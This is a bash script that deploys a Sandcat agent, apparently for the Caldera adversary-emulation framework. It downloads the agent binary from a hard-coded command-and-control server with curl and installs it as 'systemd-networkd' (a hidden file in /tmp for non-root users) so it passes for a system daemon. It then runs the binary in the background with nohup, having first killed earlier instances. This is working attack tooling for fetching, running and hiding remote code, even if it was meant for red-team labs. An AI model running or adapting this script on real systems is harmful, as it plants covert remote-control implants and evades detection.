#!/bin/bash
#
# Sandcat Linux Deployment Script - Systemd Masquerading
# Uses systemd-networkd for stealth (common Linux network daemon)
#

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Caldera server
SERVER="http://192.168.124.133:8888"

echo -e "${BLUE}[*]${NC} Sandcat Linux Deployment"
echo -e "${BLUE}[*]${NC} Target: Linux systems"
echo -e "${BLUE}[*]${NC} Masquerade: systemd-networkd (network daemon)"
echo ""

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    echo -e "${YELLOW}[!]${NC} Running as root - using /usr/local/bin"
    INSTALL_PATH="/usr/local/bin/systemd-networkd"
else
    echo -e "${YELLOW}[!]${NC} Running as user - using /tmp"
    INSTALL_PATH="/tmp/.systemd-networkd"
fi

echo -e "${BLUE}[*]${NC} Install path: $INSTALL_PATH"

# Kill existing instance
echo -e "${BLUE}[*]${NC} Checking for existing instances..."
pkill -f "$(basename $INSTALL_PATH)" 2>/dev/null && echo -e "${GREEN}[✓]${NC} Killed existing instance" || echo -e "${YELLOW}[!]${NC} No existing instance"

# Remove old binary
if [[ -f "$INSTALL_PATH" ]]; then
    echo -e "${BLUE}[*]${NC} Removing old binary..."
    rm -f "$INSTALL_PATH"
fi

# Download Sandcat
echo -e "${BLUE}[*]${NC} Downloading Sandcat agent..."
curl -s -X POST \
    -H "file:sandcat.go" \
    -H "platform:linux" \
    "$SERVER/file/download" > "$INSTALL_PATH"

if [[ $? -ne 0 ]]; then
    echo -e "${RED}[✗]${NC} Download failed!"
    exit 1
fi

# Make executable
chmod +x "$INSTALL_PATH"

# Verify binary
if [[ ! -x "$INSTALL_PATH" ]]; then
    echo -e "${RED}[✗]${NC} Binary not executable!"
    exit 1
fi

FILE_SIZE=$(stat -c%s "$INSTALL_PATH" 2>/dev/null || stat -f%z "$INSTALL_PATH" 2>/dev/null)
echo -e "${GREEN}[✓]${NC} Downloaded agent (${FILE_SIZE} bytes)"

# Start agent
echo -e "${BLUE}[*]${NC} Starting agent in background..."
nohup "$INSTALL_PATH" -server "$SERVER" -group red > /dev/null 2>&1 &
AGENT_PID=$!

sleep 2

# Verify process
if ps -p $AGENT_PID > /dev/null 2>&1; then
    echo -e "${GREEN}[✓]${NC} Agent started successfully (PID: $AGENT_PID)"
    echo -e "${GREEN}[✓]${NC} Process name: $(basename $INSTALL_PATH)"
    echo ""
    echo -e "${BLUE}[*]${NC} Check agent status:"
    echo -e "    ps aux | grep $(basename $INSTALL_PATH)"
else
    echo -e "${RED}[✗]${NC} Agent failed to start!"
    exit 1
fi

echo ""
echo -e "${GREEN}[✓]${NC} Deployment complete!"
